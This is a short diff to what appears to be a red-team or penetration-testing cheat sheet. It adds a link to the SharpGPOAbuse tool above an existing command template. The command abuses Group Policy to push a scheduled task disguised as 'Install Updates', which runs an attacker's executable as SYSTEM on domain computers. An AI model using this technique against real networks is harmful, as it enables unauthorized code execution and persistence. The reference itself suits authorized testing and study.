@@ -583,6 +583,7 @@ net localgroup administrators
 ```
 
 #### Create scheduled task
+- https://github.com/FSecureLABS/SharpGPOAbuse
 ```
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
 ```
